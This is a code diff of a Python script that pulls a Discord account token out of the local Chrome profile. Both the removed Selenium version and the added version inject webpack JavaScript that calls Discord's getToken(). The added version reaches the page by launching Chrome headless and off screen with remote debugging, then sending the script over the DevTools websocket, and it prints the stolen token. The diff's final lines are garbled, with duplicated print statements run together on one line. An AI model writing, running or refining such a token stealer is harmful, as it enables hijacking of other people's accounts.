@@ -1,72 +1,71 @@
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
+import subprocess
+import requests
+import json
 import time
 import os
-import tempfile
-import shutil
+import websocket
 
 def get_discord_token():
-    original_profile = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
-    temp_profile = os.path.join(tempfile.gettempdir(), 'chrome_temp_profile')
-
-    if os.path.exists(temp_profile):
-        shutil.rmtree(temp_profile, ignore_errors=True)
-    os.makedirs(os.path.join(temp_profile, 'Default'), exist_ok=True)
-
-    for folder in ['Local Storage', 'Session Storage', 'Cookies']:
-        src = os.path.join(original_profile, folder)
-        dst = os.path.join(temp_profile, 'Default', folder)
-        if os.path.exists(src):
-            try:
-                shutil.copytree(src, dst)
-            except:
-                pass
-
-    shutil.copy2(
-        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State'),
-        os.path.join(temp_profile, 'Local State')
-    )
-
-    o = Options()
-    o.add_argument(f'--user-data-dir={temp_profile}')
-    o.add_argument('--profile-directory=Default')
-    o.add_argument('--no-sandbox')
-    o.add_argument('--headless=new')
-    o.add_argument('--disable-dev-shm-usage')
-    o.add_argument('--disable-blink-features=AutomationControlled')
-    o.add_experimental_option('excludeSwitches', ['enable-logging', 'enable-automation'])
-    o.add_experimental_option('useAutomationExtension', False)
-    o.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
-
+    chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+    profile_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
+    
+    print("Opening Chrome silently...")
+    proc = subprocess.Popen([
+        chrome_path,
+        '--remote-debugging-port=9222',
+        f'--user-data-dir={profile_path}',
+        '--profile-directory=Default',
+        '--headless=new',
+        '--no-sandbox',
+        '--disable-gpu',
+        '--window-position=-32000,-32000',  # Move off screen as fallback
+        'https://discord.com/app'
+    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    print("Waiting for Discord to load...")
+    time.sleep(10)
+    
     try:
-        service = Service()
-        driver = webdriver.Chrome(service=service, options=o)
-        print("Browser started!")
-
-        driver.get('https://discord.com/app')
-        print("Waiting for Discord...")
-        time.sleep(8)
-
-        token = driver.execute_script("""
-            return (webpackChunkdiscord_app.push(
-                [[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m
-            ).find(m=>m?.exports?.default?.getToken!==void 0)
-             .exports.default.getToken()
-        """)
-
-        driver.quit()
-        shutil.rmtree(temp_profile, ignore_errors=True)
-        return token
-
+        tabs = requests.get('http://localhost:9222/json').json()
+        
+        discord_tab = None
+        for tab in tabs:
+            if 'discord.com' in tab.get('url', ''):
+                discord_tab = tab
+                break
+        
+        if not discord_tab:
+            discord_tab = tabs[0]
+        
+        ws_url = discord_tab['webSocketDebuggerUrl']
+        
+        result = {}
+        
+        def on_message(ws, message):
+            data = json.loads(message)
+            if data.get('id') == 1:
+                result['token'] = data.get('result', {}).get('result', {}).get('value')
+                ws.close()
+        
+        def on_open(ws):
+            ws.send(json.dumps({
+                'id': 1,
+                'method': 'Runtime.evaluate',
+                'params': {
+                    'expression': "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
+                }
+            }))
+        
+        ws = websocket.WebSocketApp(ws_url, on_message=on_message, on_open=on_open)
+        ws.run_forever(ping_timeout=10)
+        
+        return result.get('token')
+        
     except Exception as e:
         print(f"Error: {e}")
-        try:
-            driver.quit()
-        except:
-            pass
-        shutil.rmtree(temp_profile, ignore_errors=True)
         return None
+    finally:
+        proc.terminate()
 
 if __name__ == '__main__':
     token = get_discord_token()
@@ -75,6 +74,10 @@ if __name__ == '__main__':
         print("TOKEN:")
         print("="*60)
         print(token)
+        print("="*60)
+    else:
+        print("Failed - headless might have blocked Discord.")
+        print("Try removing --headless=new line if this fails.")        print(token)
         print("="*60)
     else:
         print("Failed - Discord likely blocked headless mode.")
